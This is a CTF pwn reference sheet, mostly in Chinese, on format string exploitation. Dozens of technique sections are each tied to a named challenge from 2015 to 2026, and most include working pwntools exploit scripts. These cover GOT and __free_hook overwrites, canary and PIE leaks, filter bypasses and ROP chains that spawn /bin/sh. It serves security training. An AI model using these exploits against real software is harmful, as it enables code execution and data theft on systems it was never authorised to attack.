# CTF Pwn - Format String Exploitation

## Table of Contents
- [Format String Basics](#format-string-basics)
- [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
- [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
- [Format String with Filter Bypass](#format-string-with-filter-bypass)
- [Format String Canary + PIE Leak](#format-string-canary--pie-leak)
- [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc--234)
- [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
- [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
- [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
- [argv\[0\] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
- [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
- [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
- [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
- [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
- [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
- [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
- [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
- [Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)](#format-string-exploit-through-rot13-encoding-sunshinectf-2018)
- [Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)](#format-string-in-http-user-agent-for-pie-leak-x-mas-ctf-2018)
- [Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)](#null-byte-address-fragmentation-in-small-buffers-fireshell-2019)

---

## Format String Basics

- 泄漏栈：`%p.%p.%p.%p.%p.%p`
- 泄漏指定偏移：`%7$p`
- 写值：`%n`（4 字节）、`%hn`（2 字节）、`%hhn`（1 字节）、`%lln`（8 字节）
- 通过 GOT overwrite 实现代码执行

**写入大小说明（x86-64）：**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32 位值 |
| `%hn` | 2 | 拆分写 |
| `%hhn` | 1 | 精准按字节写 |
| `%lln` | 8 | 完整 64 位地址（高位会清零） |

**重要：** 在 x86-64 上，GOT 项是 8 字节。若用 `%n` 只会写低 4 字节，高 4 字节仍保留旧 libc 地址垃圾。应使用 `%lln` 写完整 8 字节并清零高位。

**任意读原语：**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**任意写原语：**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**手工 GOT overwrite（x86-64）：**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**地址偏移计算：**
- Buffer 往往从 offset 6 开始（前面是寄存器参数）
- 若格式串本体填充到 N 字节，后续地址起始偏移为：`6 + N/8`
- 例：16 字节格式串 -> 地址在 offset 8
- 例：32 字节格式串 -> 地址在 offset 10
- 例：64 字节格式串 -> 地址在 offset 14

**用测试 payload 验证偏移：**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT 目标选择：**
- 若 `exit@GOT` 不好用，就试其他 GOT 项
- `printf@GOT`、`puts@GOT`、`putchar@GOT` 常是好目标
- 优先选漏洞触发后还会被调用的函数
- 通过反汇编确认调用顺序，再决定最佳目标

**核心点：** 发送 `%p.%p.%p` 作为输入，若输出中出现十六进制地址，就说明程序把用户输入直接作为 `printf`/`sprintf` 的格式串。这同时给出任意读（目标地址配 `%s`）和任意写（`%n` 系列）原语。

## Argument Retargeting (Non-Positional %n Trick)

当不能直接嵌入地址（输入过滤、换行限制），但仍能使用 `%n`，且栈上存在可用指针参数时，使用该技巧。

**核心思路：** 非位置参数格式符会按顺序消费参数。你可以先覆写“未来某个参数”的值，而这个参数本身又是一个指针；随后再把它当成任意写目标使用。

**为何必须非位置参数：** 位置参数（如 `%22$hn`）会被 glibc 提前缓存，解析完后再改底层栈槽并不会影响实际使用的指针。非位置 `%n` 不受这个缓存机制影响。

**流程（示例）：**
1. 泄漏偏移，找到一个可覆写的栈指针参数（例如栈上的 saved `rbp`）。
2. 用 `%c` 推进参数索引（每个 `%c` 消耗一个参数）。
3. 用 `%n` 向那个指针槽写 4 字节值（例如让 arg22 指向 `exit@GOT`）。
4. 再打印额外字符，并用 `%hn` 向“已重定向”的指针目标写低 2 字节。

**概念模式：**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**宽度计算：**
- 用 `%n` 写入 `target_addr` 后，已打印字符数为 `C`
- 要用 `%hn` 写低 2 字节 `W`，则应补打印：
  - `delta = (W - (C % 65536)) mod 65536`

**适合的环境：**
- No PIE / Partial RELRO（GOT 可写）
- 可以承受大输出（数百万字符）

**栈布局发现（找你的输入偏移）：**
```text
%1$p %2$p %3$p ... %50$p
```
- 你的输入会出现在某个 offset（常见是 6-8）
- Canary：形如 `0x...00`
- Saved RBP：看起来像栈地址
- 返回地址：代码段地址（PIE 或 libc）

## Blind Pwn (No Binary Provided)

没有 binary 时，利用格式串从零摸清所有信息：

**1. 确认漏洞：**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. 通过泄漏栈判断保护：**
- 找 canary（约 offset 39，模式 `0x...00`）
- 找 saved RBP（约 offset 40，栈地址）
- 找返回地址（约 offset 41-43，代码指针）

**3. 确定 PIE 基址：**
- 泄漏一个落在 main/程序内部的返回地址
- 减去已知偏移得到基址（有时需要猜测）

**4. 导出 GOT 识别 libc：**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. 对 libc 数据库交叉检索：**
- https://libc.blukat.me/
- https://libc.rip/
- 输入多个泄漏函数地址，识别精确 libc 版本

**核心点：** blind pwn 的关键是系统化探测：先泄漏栈，定位 canary/PIE/libc 指针；再用任意读导出 GOT；最后拿泄漏地址去 libc 数据库确认版本，才能计算 one_gadget 或 `system()` 的偏移。

**6. 计算 libc 基址：**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**常见栈偏移（x86_64）：**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | 用户输入缓冲区 |
| ~39 | 栈 canary |
| ~40 | Saved RBP |
| ~41-43 | 返回地址 |

## Format String with Filter Bypass

**模式（Cvexec）：** `filter_string()` 会移除 `%`，但可用 `%%%p` 跳过。

**过滤绕过：** 如果过滤器检查 `%` 后面的相邻字符：
- `%p` -> 被过滤
- `%%p` -> 正常转义（输出字面量 `%p`）
- `%%%p` -> 第三个 `%` 存活，最终打印栈值

**通过格式串逐字节 GOT overwrite（`%hhn`）：**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**模式（My Little Pwny）：** 用格式串漏洞泄漏 canary 与 PIE 基址，再接缓冲区溢出。

**两阶段攻击：**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

## __free_hook Overwrite via Format String (glibc < 2.34)

**模式（Notetaker, PascalCTF 2026）：** Full RELRO + No PIE + 格式串漏洞。无法覆写 GOT，但 `__free_hook` 仍可写。

**核心点：** `free(ptr)` 会把 `ptr` 放进 `rdi` 作为首参。若令 `__free_hook = system`，那么 `free("cat flag")` 就等价于执行 `system("cat flag")`。

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**适用场景：** Full RELRO（不能改 GOT）+ glibc < 2.34（hook 仍存在）。对于 glibc >= 2.34，hook 已移除，应转向返回地址或 `_IO_FILE` 结构。

## .rela.plt / .dynsym Patching

**适用场景：** GOT 地址含坏字节（例如用 fgets 时 `0x0a`），导致无法直接写 GOT。要求 `.rela.plt` 和 `.dynsym` 位于可写内存。

**技巧：** 修改 `.rela.plt` 中重定位项的符号索引，使其指向另一个符号；再修改 `.dynsym` 中该符号的 `st_value` 为 `win()` 地址。原函数下次被调用时，动态链接器会沿着被篡改的重定位信息跳到 `win()`。

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**当 GOT 有坏字节，而 `.rela.plt`/`.dynsym` 没有：** 该技巧完全绕过 GOT 直接写入限制，因为你根本不碰 GOT。

**核心点：** 若 GOT 地址带坏字节，别执着于直接写 GOT。改写 `.rela.plt` 的符号重定位链，再修改 `.dynsym` 对应符号值，动态链接器下次解析时就会跳到你的目标地址。

---

## Format String for Game State Manipulation (UTCTF 2026)

**模式（Small Blind）：** 扑克/卡牌游戏中，玩家名存在格式串漏洞。栈上正好存着指向游戏状态变量的指针（玩家筹码、庄家筹码等）。直接写这些变量即可达成胜利条件。

**核心点：** `%n` 写入“当前已输出字符数”。用 `%Xc` 精准控制输出数量，再用 `%N$n` 把这个值写到第 N 个栈参数所指向的游戏变量。

**利用：**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**发现流程：**
1. **确认格式串：** 名字里发 `%p.%p.%p.%p`，观察是否回显地址
2. **映射栈位置：** 依次测试 `%6$n`、`%7$n`、`%8$n` 配合不同 `%Xc`
3. **确认哪个变量变化：** 对比游戏输出（筹码、分数、血量）前后变化
4. **确定胜利条件：** 可能是 `player_chips >= threshold` 或 `player > dealer`
5. **构造获胜 payload：** 提高玩家筹码（`%9999c%7$n`）或把庄家筹码写成 0（`%6$n`）

**常见栈上游戏状态模式：**
| Position | Typical Variable |
|----------|-----------------|
| 6 | 指向庄家/对手状态的指针 |
| 7 | 指向玩家状态的指针 |
| 8-10 | 分数、生命、背包 |

**当 `%n` 写到相邻变量：** 若玩家与庄家筹码在内存中相邻（相差 4 字节），那么位置 N 与 N+1 分别指向它们。可把庄家写成 0（0 个输出字符 + `%N$n`），玩家写成高值（`%9999c%(N+1)$n`）。

**核心点：** 游戏题里的格式串通常不需要拿 shell，只需篡改状态触发胜利条件。先把栈位置映射到游戏变量，再写入赢面状态即可。

---

## Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)

**模式（EBP）：** 格式串缓冲区位于 `.bss`（固定地址），不在栈上。经典 `%n` 任意写通常依赖把攻击者控制的地址放到栈上，这里做不到。替代做法是覆写保存的 EBP，让函数尾声 `leave; ret` 把栈迁移到 `.bss` 缓冲区。

**`leave; ret` 的行为：**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**位于 `.bss` 地址 `0x0804A080` 的利用布局：**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```

通过 `%n` 把 `buf_addr - 4`（例如 `0x0804A07C`）写入保存的 EBP。函数返回时，`leave` 会令 `esp = 0x0804A07C`，随后 `ret` 从 `0x0804A080` 取出值跳转，也就是 shellcode 起点。

**核心点：** 当格式串缓冲区位于固定 `.bss` 地址而非栈上时，覆写 saved EBP 是最直接的 pivot 手段。`leave; ret` 由 EBP 决定新栈位置，因此控制 EBP 就等于控制后续 `ret` 从哪里取 EIP。

---

## argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)

**模式（nanana）：** 当 stack canary 被破坏，glibc 的 `__stack_chk_fail` 会打印：`*** stack smashing detected ***: <argv[0]> terminated`。而 `argv[0]` 是栈上的一个指针。如果把它覆写成某个秘密数据地址（如全局密码缓冲区），就能在崩溃提示中泄漏该内容。

**攻击步骤：**
1. 溢出越过 canary（故意破坏它）
2. 继续覆盖到 `argv[0]`（程序名指针）
3. 将 `argv[0]` 改成目标数据地址（如 `0x601090` = `g_password`）
4. 栈破坏处理器会打印：`*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**核心点：** 一次“失败的利用”若触发 `__stack_chk_fail`，也可以被改造成信息泄漏。适合作为第一阶段：先泄漏密码、canary 或地址，再在第二次连接中完成真正利用。

---

## Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)

**模式：** 若 `printf()` 之后没有其他 GOT 函数调用，可通过把 `.fini_array` 改成 `main()`，让程序反复重新进入，从而把多次格式串写串成多阶段利用：

1. **Stage 1:** 把 `.fini_array[0]` 改成 `main()`，并泄漏 libc + 栈指针
2. **Stage 2:** 把 `printf@GOT` 改成 `system()`，把 `__stack_chk_fail@GOT` 改成 `main()`
3. **Stage 3:** 故意破坏 stack canary，触发 `__stack_chk_fail` 重新进入 `main()`。这时 `printf(input)` 已经变成 `system(input)`，直接发送 `/bin/sh`

```python
# Stage 1: loop back via .fini_array, leak addresses
payload = fmtstr_payload(offset, {fini_array: main_addr})
# Stage 2: redirect printf to system, set up canary fail re-entry
payload = fmtstr_payload(offset, {printf_got: system, stack_chk_got: main_addr})
# Stage 3: corrupt canary -> __stack_chk_fail -> main -> system(input)
```

**核心点：** `.fini_array` 会在 `main()` 返回时执行。把它改成 `main()` 本身，就得到一个稳定的重入循环，适合多阶段格式串利用。再利用 `__stack_chk_fail` 作为可控重入向量，就能完成最后的 shell 获取。

**References:** Codegate 2016

---

## __printf_chk Bypass with Sequential %p (VolgaCTF 2017)

**模式：** `__printf_chk()` 会阻止 `%n` 写入和直接参数访问（`%123$p`）。但仍可用顺序 `%p` 链一路走到目标栈偏移。

```python
from pwn import *

# __printf_chk restrictions:
# - No %n/%hn/%hhn writes
# - No direct access: %123$p fails
# - Sequential access still works: %p%p%p...

# Leak canary at stack offset 267:
payload = "%p." * 267 + "%p"  # sequential %p to offset 267
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
canary = int(leaks[266], 16)  # 267th value (0-indexed)

# Leak libc return address at offset 269:
payload = "%p." * 269 + "%p"
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
libc_ret = int(leaks[268], 16)
libc_base = libc_ret - known_offset

# Then use stack overflow for ROP since format string write is blocked
payload = b"A" * buf_size
payload += p64(canary)
payload += p64(0)           # saved rbp
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
```

**核心点：** 虽然 `__printf_chk` 禁掉了 `%n` 和 `%N$` 直接定位，但并没有禁掉顺序格式符。连上几百个 `%p` 仍然可以走到任意栈槽，拿到 canary、libc、PIE 泄漏，再与其他溢出原语配合完成写阶段。

**识别特征：** 二进制使用 `__printf_chk` 或 `__fprintf_chk`（反汇编中可见，或启用 `__fortify_source`）。直接 `%N$p` 失败，但 `%p%p%p...` 仍有效。输出会很长，解析时最好加分隔符。

**References:** VolgaCTF 2017

---

## Leak + GOT Overwrite in Single printf Call (picoCTF 2017)

**模式：** 若格式串漏洞之后立即执行 `exit(0)`，需要在同一次 `printf` 中同时完成地址泄漏与 GOT 覆写。

```python
from pwn import *

# Must leak libc AND redirect exit() in one printf call
# Layout: padding + dummy_addr + %leak$p + %Nc + %write$hn + padding + got_addr

exit_got = elf.got['exit']
main_addr = elf.sym['main']
target_low16 = main_addr & 0xFFFF

payload = b'e_______'                     # 8 bytes padding
payload += p64(0x4141414141)              # dummy (consumed by leak specifier)
payload += b' %25$p'                      # leak libc address at offset 25
# Calculate bytes needed: target_low16 - bytes_written_so_far
bytes_written = len(payload)
padding_needed = (target_low16 - bytes_written) % 0x10000
payload += f'%{padding_needed}c%19$hn'.encode()  # write low 2 bytes to offset 19
payload += b'A' * ((8 - (len(payload) % 8)) % 8) # alignment to 8 bytes
payload += p64(exit_got)                  # address for %19$hn write

# Result: leaks libc via %25$p AND overwrites exit@GOT via %19$hn
# exit() jumps back to main for second-stage exploitation
io.sendline(payload)

# Parse leaked libc address from output
io.recvuntil(b' 0x')
libc_leak = int(io.recv(12), 16)
libc_base = libc_leak - known_offset

# Second pass: now with libc known, overwrite for shell
# ...
```

**核心点：** 单次 `printf` 可同时做读（`%p`）和写（`%hn`）。当漏洞后立刻 `exit()` 时，就在同一调用里既泄漏 libc，又把 `exit@GOT` 改成 `main`，从而获得第二阶段机会。

**识别特征：** 格式串漏洞只有一次机会，随后就是 `exit()` 或其他终止函数。单调用技术就是为这种无重入点的一次性场景设计的。

**References:** picoCTF 2017

---

## Objective-C %@ Format Specifier Exploitation (SHA2017)

**模式：** Objective-C 的 `NSLog` 等函数支持 `%@`，会调用 `objc_msg_lookup(rdi, ...)`，把对应栈值当成 Objective-C 对象指针。若你能控制 `%N$@` 所指向的栈值，就能控制 `rdi`。分析 `objc_msg_lookup` 可发现一个在特定条件下可达的 `call rax` gadget，从而实现单次执行。

**机制：**
```text
NSLog(@"Hello %@", user_input)
    → %@ consumes next argument from stack
    → argument is treated as Objective-C object pointer (rdi)
    → objc_msg_lookup(rdi, "description") is called
    → if [rdi+8] == 0 (ISA check fails), execution reaches: call rax
    → rax is under attacker control via the crafted "object"
```

**利用：**
```python
# Craft a fake Objective-C object on the stack via format string write
# Object layout: [isa_ptr][method_list_ptr][...]
# Set isa_ptr = 0 to reach the call rax path in objc_msg_lookup
# Set rax = one_gadget or system() via prior %n writes

# Locate %N$@ position: stack offset where fake object pointer lands
# Use %n to write fake object address at the right stack slot
# Then trigger %@ to call objc_msg_lookup → call rax → shell
payload = b'%<distance>c%<write_offset>$lln'  # write fake obj addr
payload += b'%<obj_offset>$@'                  # trigger call rax
```

**核心点：** Objective-C 格式串多了 `%@` 这个入口，它会把一个栈值送进 objc runtime，相当于把只读型 FSB 转成一次可控调用原语。若能构造“ISA 为空”的假对象，就能走到 `call rax` 分支。

**References:** SHA2017

---

## strlen Integer Truncation Bypass (ASIS CTF Finals 2017)

**模式：** 程序通过 `strlen(input)+1` 检查输入中每个字符是否都是小写字母，但 `strlen()` 结果被强制转换成 `int8_t`。当输入长度为 255 时，`(int8_t)(255 + 1)` 会溢出为 0，导致整个过滤窗口坍缩为空区间。放在第 255 字节之后的 `%n` 等 payload 可直接绕过过滤。

**漏洞代码模式：**
```c
void filter(char *input) {
    int8_t len = (int8_t)strlen(input);  // truncates at 255 → wraps to -1 or 0
    for (int8_t i = 0; i <= len; i++) {  // at len==-1 (255 cast): 0 <= -1 is false
        if (!islower(input[i]))
            reject();
    }
}
```

**利用：**
```python
# Pad with 255 lowercase bytes, then place %n-based payload starting at byte 255
# The filter checks bytes 0..len, but len wraps to -1 (or 0+1=0), so no bytes checked
filler = b'a' * 255
exploit_suffix = b'%7$n' + p64(target_addr)  # unchecked bytes
payload = filler + exploit_suffix
```

**核心点：** `strlen()` 结果被截断到 `int8_t` 后，在长度 255 时发生有符号溢出，直接把检查窗口压成 0。凡是长度被存入短整型或有符号类型时，都要检查整数截断。

**References:** ASIS CTF Finals 2017

---

## printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)

**模式：** 借助 glibc 内部的 printf 分发表，把一个普通缓冲区溢出转成信息泄漏，无需真实的格式串漏洞。当 `printf_function_table` 非空时，glibc 会改为通过 `printf_arginfo_table` 分派格式符处理器。

**机制：**
1. 通过缓冲区溢出构造一个假的 `printf_arginfo_size_function` 结构，指向 `_fortify_fail`
2. 覆写 `__libc_argv`，让 `_fortify_fail` 打印 flag，而不是原始 `argv[0]`
3. 把 `printf_function_table` 设为非空（触发替代分派路径）
4. 把 `printf_arginfo_table` 指向伪造结构

**分派方式：**
```c
// Inside glibc's printf implementation:
if (__printf_function_table != NULL) {
    // Alternate path: look up handler via printf_arginfo_table
    int spec_index = format_char;  // e.g., 'd' = 100
    // Calls printf_arginfo_table[spec_index](...)
    // → redirected to _fortify_fail
}

// _fortify_fail prints:
//   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0]
// If __libc_argv[0] points to the flag → flag is leaked
```

**利用：**
```python
from pwn import *

# Addresses determined from libc
printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF
printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF
libc_argv = libc_base + LIBC_ARGV_OFF
fortify_fail = libc_base + FORTIFY_FAIL_OFF

# Step 1: Overflow to overwrite __libc_argv to point to flag location
# Step 2: Create fake arginfo table entry pointing to _fortify_fail
# Step 3: Set printf_function_table to non-NULL
# Step 4: Set printf_arginfo_table to fake table

# Any subsequent printf with a format specifier (e.g., %d, %s)
# triggers: printf_arginfo_table['d'] → _fortify_fail
# _fortify_fail reads __libc_argv[0] → prints flag contents
```

**核心点：** 一旦 `printf_function_table` 非空，glibc 的格式符分派就能被你接管。把处理器改成 `_fortify_fail`，再让 `__libc_argv[0]` 指向 flag，就能把普通缓冲区溢出转成稳定泄漏。

**识别特征：** 有缓冲区溢出能打到 glibc 全局区，但没有直接格式串漏洞；且程序在溢出后仍会调用带格式符的 `printf`。适合做信息外带，而不一定是直接代码执行。

**References:** 34C3 CTF 2017

---

## scanf Format String on Stack Overwrite (TUCTF 2017)

**模式：** 如果 `scanf` 的格式串（如 `"%30s"`）不是在 `.rodata`，而是作为局部变量放在栈上，第一次输入就可以溢出并改写这个格式串，把下一次 `scanf` 的读入上限扩大。

**两阶段溢出：**
```python
from pwn import *

# Stage 1: Overflow the scanf format string on the stack
# Format "%30s" is stored 0x14 bytes after the input buffer
# Overwrite it to become "%99s"
payload0 = b"0" * 0x14 + p32(0x73393925)  # 0x73393925 = "%99s" in little-endian
io.sendline(payload0)

# Stage 2: scanf now reads up to 99 bytes instead of 30
# Use the expanded buffer to reach and overwrite the return address
payload1 = b"0" * 0x31 + p32(win_addr)     # 0x31 bytes padding + return address
io.sendline(payload1)
```

**栈布局：**
```text
+0x00: input_buffer[30]    ← scanf reads here
+0x14: format_string[4]    ← "%30s" (overwritten to "%99s")
  ...
+0x31: saved_ebp
+0x35: return_address       ← target for stage 2
```

**核心点：** 若 `scanf` 的格式限制字符串位于栈上，那么第一次输入可先把它改大，第二次再利用放宽后的长度上限打到返回地址。判断格式串是否在栈上的方法是看反汇编：来自 `rbp`/`rsp` 偏移就是栈，来自 `rip` 相对地址则多半在 `.rodata`。

**识别特征：** 二进制用了 `scanf("%30s")` 这类长度限制，但当前溢出距离返回地址只差一点点。如果格式串是栈变量，这种双阶段技巧正好补足差距。

**References:** TUCTF 2017

---

## Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)

**模式：** 某“ROT13 加密服务”会先对用户输入做 ROT13，再把结果传给 `printf`。因此需要先用 ROT13 对格式串 payload 编码，使其经过程序的 ROT13 后回到原始格式串。

**攻击链：**
1. 输入在到达 `printf` 前会被程序做 ROT13
2. ROT13 是自反的：`rot13(rot13(x)) = x`
3. 先对格式串 payload 做 ROT13，程序再做一次后就恢复为目标格式串
4. 用 ROT13 编码的 `%p` 泄漏 libc 与程序地址
5. 构造 `fmtstr_payload` 把 `strlen@GOT` 改成 `system`，随后发送 `/bin/sh`

```python
import codecs
from pwn import *

def rot13(s):
    return codecs.encode(s, 'rot_13')

io = remote('target', 1337)

# Stage 1: Leak addresses through ROT13 transform
# rot13('%2$x|%3$x') produces encoded string; after binary's rot13, printf sees '%2$x|%3$x'
io.sendline(rot13('%2$x|%3$x').encode())
leak = io.recvline().decode()
libc_leak, prog_leak = leak.split('|')
libc_base = int(libc_leak, 16) - known_offset
prog_base = int(prog_leak, 16) - known_offset

# Stage 2: Overwrite strlen@GOT with system via format string
strlen_got = prog_base + elf.got['strlen']
system_addr = libc_base + libc.symbols['system']
writes = {strlen_got: system_addr}
payload = fmtstr_payload(7, writes)

# ROT13-encode the entire payload so binary's rot13 produces the real fmt string
encoded_payload = rot13(payload.decode('latin-1')).encode('latin-1')
io.sendline(encoded_payload)

# Stage 3: Send /bin/sh -- strlen("/bin/sh") now calls system("/bin/sh")
io.sendline(b'/bin/sh')
io.interactive()
```

**核心点：** 只要格式串 sink 前存在可逆变换（ROT13、凯撒、XOR、替换表等），就先用逆变换预编码 payload。ROT13 因为自反，实现最直接。

**References:** SunshineCTF 2018

---

## Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)

**模式：** 一个启用 PIE 的 HTTP 服务会用 `printf(ua)` 记录 `User-Agent`。没有其他信息泄漏原语，但 canary 和 PIE 基址都在日志函数附近的栈帧中。一条请求就足够同时泄漏两者。

```python
# Leak canary at offset 6, PIE base at offset 7
r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
pie_base = pie - elf.sym['main']
```

**核心点：** 任何会进入格式串 sink 的 HTTP 头都能把远程 HTTP 服务变成泄漏 oracle。优先检查日志、报错和反射头字段。

**References:** X-MAS CTF 2018 — I want that toy, writeup 12672

---

## Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)

**模式：** 漏洞缓冲区只有 16 字节，因此直接用 `fmtstr_payload(offset=..., writes={addr: val})` 会失败，因为地址中的空字节会让 `printf` 提前停止。解决办法是把格式串指令放前面，把目标地址放最后面，让 `printf` 先解析格式符，再遇到地址。

```python
fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
# printf processes %9x%11$n using the address at offset 11 (the trailing 8 bytes)
# Writes 0x9 (from %9x count) to *0x602020
```

**核心点：** 地址中的空字节只有在地址位于格式串前部时才会打断解析。把格式符放在前，地址尾置，再用 `%$n` 引用后面的地址槽即可。

**References:** FireShell CTF 2019 — casino, writeup 12916
